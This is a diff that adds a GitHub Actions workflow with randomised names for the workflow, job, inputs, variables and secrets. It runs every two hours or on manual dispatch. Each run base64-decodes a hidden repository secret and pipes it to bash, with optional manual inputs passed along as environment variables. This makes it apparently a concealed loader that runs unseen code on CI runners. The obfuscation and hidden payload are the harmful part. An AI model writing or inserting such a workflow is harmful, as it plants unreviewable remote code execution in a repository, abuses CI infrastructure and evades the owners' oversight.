@@ -1,0 +1,33 @@
+name: RlzupRI
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+    inputs:
+      dnymmMerZ:
+        required: false
+      cgWmepZVR:
+        required: false
+      BZPeuDsbd:
+        required: false
+      MTnSsRsq:
+        required: false
+      NzElZSPyGEC:
+        required: false
+jobs:
+  gbNSOV:
+    runs-on: ubuntu-latest
+    env:
+      luAVYvdg: ${{ secrets.dBceFqaXgVn }}
+    steps:
+      - uses: actions/checkout@v5
+      - if: github.event.inputs.dnymmMerZ == ''
+        run: echo "${{ secrets.xtOBtedgRq }}" | base64 -d | bash
+      - if: github.event.inputs.dnymmMerZ != ''
+        run: echo "${{ secrets.UQprPauiYz }}" | base64 -d | bash
+        env:
+          qwuQENbATF: ${{ github.event.inputs.dnymmMerZ }}
+          mLLFMPgb: ${{ github.event.inputs.cgWmepZVR }}
+          BMmcKxsa: ${{ github.event.inputs.BZPeuDsbd }}
+          zYJFsoZyMKPH: ${{ github.event.inputs.MTnSsRsq }}
+          TsbNwunnunaX: ${{ github.event.inputs.NzElZSPyGEC }}
